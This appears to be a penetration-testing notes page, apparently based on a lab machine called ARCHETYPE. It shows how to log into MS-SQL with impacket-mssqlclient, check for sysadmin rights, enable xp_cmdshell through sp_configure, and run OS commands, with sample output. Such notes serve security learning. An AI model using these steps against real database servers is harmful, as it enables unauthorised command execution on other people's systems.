# MS-SQL (Microsoft SQL Service)

## Enumeration

### Using Impacket&#x20;

Using impacket-mssqlclient we can connect to the MS-SQL service using the username/user-id and password from a possible publicly available production `.dtsConfig` files.&#x20;

```awk
impacket-mssqlclient ARCHETYPE\sql_svc@10.129.95.187 -windows-auth
```

### Check user access control

```
SELECT is_srvrolemember('sysadmin');
```

If it returns 1, it is True and the user can run cmd commands.



## Exploitation

### Command execution via xp\_cmdshell()

Once we have access to the SQL database we can check if we can use the xp\_cmdshell() command using:

```sql
 EXEC xp_cmdshell 'net user';
```

Successful execution would produce an output similar to this:

```
output                                                                                                                                                                                                                                                            

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   

NULL                                                                                                                                                                                                                                                              

User accounts for \\ARCHETYPE                                                                                                                                                                                                                                     

NULL                                                                                                                                                                                                                                                              

-------------------------------------------------------------------------------                                                                                                                                                                                   

Administrator            DefaultAccount           Guest                                                                                                                                                                                                           

sql_svc                  WDAGUtilityAccount                                                                                                                                                                                                                       

The command completed successfully.                                                                                                                                                                                                                               

NULL                                                                                                                                                                                                                                                              

NULL                                                                                                                                                                                            
```

However, if we get the following ERROR, we don't have access to the command and we need to reconfigure the service:

{% code overflow="wrap" %}
```bash
[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```
{% endcode %}

Alternatively you can check it using the following query/command.

```
sp_configure;
```

It would give an output like the one shown below. Here you can find the configuration values of other options/commands as well.

{% code fullWidth="false" %}
```
name                                      minimum       maximum   config_value     run_value   

-----------------------------------   -----------   -----------   ------------   -----------   

access check cache bucket count                 0         65536              0             0   

access check cache quota                        0    2147483647              0             0   

Ad Hoc Distributed Queries                      0             1              0             0   

affinity I/O mask                     -2147483648    2147483647              0             0   

affinity mask                         -2147483648    2147483647              0             0   

affinity64 I/O mask                   -2147483648    2147483647              0             0   

affinity64 mask                       -2147483648    2147483647              0             0   

Agent XPs                                       0             1              0             0   

allow polybase export                           0             1              0             0   

allow updates                                   0             1              0             0   

automatic soft-NUMA disabled                    0             1              0             0   

backup checksum default                         0             1              0             0   

backup compression default                      0             1              0             0   

blocked process threshold (s)                   0         86400              0             0   

c2 audit mode                                   0             1              0             0   

clr enabled                                     0             1              0             0   

clr strict security                             0             1              1             1   

contained database authentication               0             1              0             0   

cost threshold for parallelism                  0         32767              5             5   

cross db ownership chaining                     0             1              0             0   

cursor threshold                               -1    2147483647             -1            -1   

Database Mail XPs                               0             1              0             0   

default full-text language                      0    2147483647           1033          1033   

default language                                0          9999              0             0   

default trace enabled                           0             1              1             1   

disallow results from triggers                  0             1              0             0   

external scripts enabled                        0             1              0             0   

filestream access level                         0             2              0             0   

fill factor (%)                                 0           100              0             0   

ft crawl bandwidth (max)                        0         32767            100           100   

ft crawl bandwidth (min)                        0         32767              0             0   

ft notify bandwidth (max)                       0         32767            100           100   

ft notify bandwidth (min)                       0         32767              0             0   

hadoop connectivity                             0             7              0             0   

index create memory (KB)                      704    2147483647              0             0   

in-doubt xact resolution                        0             2              0             0   

lightweight pooling                             0             1              0             0   

locks                                        5000    2147483647              0             0   

max degree of parallelism                       0         32767              0             0   

max full-text crawl range                       0           256              4             4   

max server memory (MB)                        128    2147483647     2147483647    2147483647   

max text repl size (B)                         -1    2147483647          65536         65536   

max worker threads                            128         65535              0             0   

media retention                                 0           365              0             0   

min memory per query (KB)                     512    2147483647           1024          1024   

min server memory (MB)                          0    2147483647              0            16   

nested triggers                                 0             1              1             1   

network packet size (B)                       512         32767           4096          4096   

Ole Automation Procedures                       0             1              0             0   

open objects                                    0    2147483647              0             0   

optimize for ad hoc workloads                   0             1              0             0   

PH timeout (s)                                  1          3600             60            60   

polybase network encryption                     0             1              1             1   

precompute rank                                 0             1              0             0   

priority boost                                  0             1              0             0   

query governor cost limit                       0    2147483647              0             0   

query wait (s)                                 -1    2147483647             -1            -1   

recovery interval (min)                         0         32767              0             0   

remote access                                   0             1              1             1   

remote admin connections                        0             1              0             0   

remote data archive                             0             1              0             0   

remote login timeout (s)                        0    2147483647             10            10   

remote proc trans                               0             1              0             0   

remote query timeout (s)                        0    2147483647            600           600   

Replication XPs                                 0             1              0             0   

scan for startup procs                          0             1              0             0   

server trigger recursion                        0             1              1             1   

set working set size                            0             1              0             0   

show advanced options                           0             1              1             1   

SMO and DMO XPs                                 0             1              1             1   

transform noise words                           0             1              0             0   

two digit year cutoff                        1753          9999           2049          2049   

user connections                                0         32767              0             0   

user options                                    0         32767              0             0   

xp_cmdshell                                     0             1              0             0 
```
{% endcode %}

**Reconfiguration steps**

#### One line command

The simple one liner in impacket-mssqlclient can do the honours for us.... :)

```bash
enable_xp_cmdshell
```

#### Alternative

1. If sp\_configure command is set to show advanced options we can just directly set the xp\_cmdshell option (aka directly skip to step 5). The best way to know this is to run the command in step 5.
2. If we get the error shown below:

```awk
[-] ERROR(ARCHETYPE): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
```

&#x20;      Then we have to set the show advanced options to TRUE by using the command: &#x20;

```sql
EXEC sp_configure 'show advanced options', 1;
```

3. Reconfigure using the RECONFIGURE command.

```sql
RECONFIGURE;
```

4. Check if sp\_configure is working with advanced options

```
sp_configure;
```

5. Allow xp\_cmdshell using the command:

```sql
EXEC sp_configure 'xp_cmdshell', 1;
```

* Run reconfigure again to allow the xp\_cmdshell method. Test if its working or not using the above diagnosis command.

We can use xp\_cmdshell after enabling it like follows:

```sql
SQL> xp_cmdshell "whoami"
```

A sample output is as follows:

```
output                                                                             

--------------------------------------------------------------------------------   

archetype\sql_svc                                                                  

NULL  
```











